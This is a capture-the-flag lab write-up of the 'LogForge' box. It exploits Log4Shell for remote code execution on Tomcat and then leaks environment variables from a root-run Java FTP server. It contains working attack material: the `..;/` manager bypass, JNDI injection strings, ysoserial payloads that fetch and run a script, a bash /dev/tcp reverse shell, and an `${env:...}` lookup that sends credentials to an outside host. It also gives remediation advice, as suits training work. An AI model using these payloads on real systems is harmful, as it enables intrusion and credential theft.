# UHC: LogForge — Log4Shell twice: RCE on Tomcat, env-var theft on a root FTP daemon

[![Difficulty](https://img.shields.io/badge/difficulty-Event-blueviolet)](https://www.youtube.com/watch?v=XG14EstTgQ4)
[![OS](https://img.shields.io/badge/OS-Linux-blue)](https://www.youtube.com/watch?v=XG14EstTgQ4)
[![](https://img.shields.io/badge/walkthrough-IppSec-ff0000?logo=youtube&logoColor=white)](https://www.youtube.com/watch?v=XG14EstTgQ4)

> **Attack path:** Tomcat path-confusion bypass (`..;/`) + default creds → manager panel → Log4Shell via JNDI → serialized gadget payload (JNDI-Exploit-Kit + ysoserial) → shell as `tomcat` → root-run Java FTP server logs usernames with Log4j → `${env:...}` lookups exfiltrate FTP creds from the process environment → FTP login rooted at `/root` → root.

LogForge was the December 2021 UHC (Ultimate Hacker's Championship) qualifier box, released days after Log4Shell (CVE-2021-44228) hit the world. It demonstrates the bug twice: once for remote code execution, and once as an information-disclosure oracle against a service you cannot otherwise reach.

## 1 · Reconnaissance

### Port scan

```bash
nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.11.138
nmap -p 22,80 -sCV -oA scans/nmap-tcpscripts 10.10.11.138
# 22/tcp open  ssh   OpenSSH 8.2p1 Ubuntu
# 80/tcp open  http  Apache httpd 2.4.41 (Ubuntu) - "Ultimate Hacking Championship"
```

The response sets a `JSESSIONID` cookie and `/index.jsp` resolves — this is Java. The default 404 page leaks **Apache Tomcat 9.0.31** (Ubuntu 20.04).

### Directory brute force

```bash
feroxbuster -u http://10.10.11.138 -x jsp,java,class
# /admin, /manager, /server-status  -> all 403
```

## 2 · Foothold

### Bypassing the manager 403 (parser confusion)

Apache proxies for Tomcat and restricts `/manager` to localhost. Orange Tsai's "Breaking Parser Logic" trick splits the difference: Apache treats `..;/` as an extra path segment (allowed), while Tomcat normalizes it back to `/manager/`:

```
http://10.10.11.138/0xdf/..;/manager/html
```

A 302 to the manager app appears, protected by basic auth — the default-style credentials `tomcat` / `tomcat` work, exposing the Tomcat Manager (and the first UHC event flag).

### WAR upload is a trap

The obvious next move — `msfvenom` WAR deploy — fails instantly: the upload limit is configured to 1 byte ("The field deployWar exceeds its maximum permitted size of 1 bytes."). The manager is a lure; the real bug is the log panel.

### Confirming Log4Shell

Tomcat 9 + this era = test Log4j everywhere. The manager's "Expire sessions with idle >" POST field lands in a log line:

```
${jndi:ldap://10.10.14.6/file}
```

With `sudo tcpdump -ni tun0 not port 80` listening, the LDAP callback to port 389 proves the lookup fires.

### JNDI exploitation kit + ysoserial

Serve a serialized Java gadget (works regardless of Java version because it abuses classpath libraries, not templates):

```bash
ysoserial CommonsCollections5 'ping -c 1 10.10.14.6' > ping.ser
sudo java -jar /opt/JNDI-Exploit-Kit/JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar \
  -P ping.ser -L 10.10.14.6:389
```

Trigger `${jndi:ldap://10.10.14.6:389/Basic/Payload}` again — ICMP comes back. ysoserial arguments dislike shell metacharacters, so get the shell in two stages — host `rev.sh` containing `bash -i >& /dev/tcp/10.10.14.6/443 0>&1`, then:

```bash
ysoserial CommonsCollections5 'wget 10.10.14.6/rev.sh -O /dev/shm/rev.sh' > getrev.ser
# trigger JNDI, then restart the kit with:
ysoserial CommonsCollections5 'bash /dev/shm/rev.sh' > runrev.ser
# trigger again
nc -lnvp 443
# tomcat@logforge:/$
```

## 3 · User flag

The tomcat user can read the flag left in the user home:

```bash
cat /home/htb/user.txt    # <flag>
```

## 4 · Privilege escalation

### Find the root-run Java FTP server

Enumeration shows the loopback-only port that matters:

```bash
ss -lntp
# 127.0.0.1:21 - java -jar /root/ftpServer-1.0-SNAPSHOT-all.jar   (running as root)
```

Pull the JAR off the box (`nc` transfer) and open it in `jd-gui`.

### Reverse engineering the Worker class

The FTP worker does two dangerous things:

```java
LOGGER.warn("Login with invalid user: " + username);        // username hits Log4j
private String validUser = System.getenv("ftp_user");
private String validPassword = System.getenv("ftp_password");
```

The real credentials live in the root process's environment variables. ysoserial gadgets won't work here (no gadget libraries in this JAR), but Log4j lookups can read environment variables — and whatever the lookup resolves becomes part of the outbound JNDI URL, which you can read on the wire.

### Leaking the credentials

Log in locally and use lookups as the username:

```
ftp localhost
Name: ${jndi:ldap://10.10.14.6/user:${env:ftp_user}:password:${env:ftp_password}}
```

In Wireshark (or tcpdump) the LDAP request path shows the resolved values:

```
/ user:ippsec : password:<password>
```

Exfiltration without execution — Log4Shell as a read primitive.

## 5 · Root flag / root shell

### FTP rooted at /root

Log into the FTP server with the leaked credentials — the session is chrooted at `/root`:

```
ftp localhost
Name: ippsec
Password: <password>
ftp> lcd /tmp
ftp> get root.txt
ftp> !cat /tmp/root.txt        # <flag>
```

### Full root shell

The FTP password is also the root account's password:

```bash
su -
# root@logforge
```

## 6 · Impact & remediation

| Risk | Impact | Remediation |
| --- | --- | --- |
| Log4Shell (CVE-2021-44228) in log handling of both Tomcat manager and the FTP daemon | Pre-auth RCE as `tomcat`; credential disclosure from root's environment | Upgrade Log4j to 2.17+; remove lookups from untrusted input (`log4j2.formatMsgNoLookups=true` is only a stopgap) |
| Front-end/back-end path parsing mismatch (`..;/`) | Access-control bypass straight into the Tomcat manager | Keep Apache and Tomcat path handling consistent; bind the manager to localhost only, with a non-default strong password |
| Default credentials `tomcat`/`tomcat` on the manager | Immediate authenticated manager access after the 403 bypass | Change default credentials, disable the manager app in production |
| Secrets passed to services via environment variables | Any Log4j `${env:...}` lookup (or `/proc` read) leaks them | Use a secrets manager; never place credentials in process environments reachable by low-privilege users |
| Root-owned FTP daemon on localhost | Its Log4j bug and its file access run with full root privileges | Drop privileges in service code; isolate daemons in containers/service users |

## 7 · CPTS takeaways

- Log4Shell is a two-for-one primitive: `${jndi:ldap://...}` gives RCE when gadgets exist, and nested lookups (`${env:VAR}` inside the JNDI URL) give blind data exfiltration when they do not — expect both in the exam.
- The `..;/` parser-confusion bypass of Apache-in-front-of-Tomcat is a classic worth knowing by heart; so is checking whether 403s come from the proxy or the app.
- JNDI-Exploit-Kit plus ysoserial serialized payloads sidestep Java version restrictions that break template-based (LDAP + factory) exploits.
- When shell metacharacters break a payload, chain simple commands: download a script with `wget`, then execute it — the two-stage pattern applies far beyond ysoserial.
- Loopback-only services are not invisible: enumerate with `ss -lntp` from any shell, and remember that a root-run service that logs user input is effectively a root oracle.
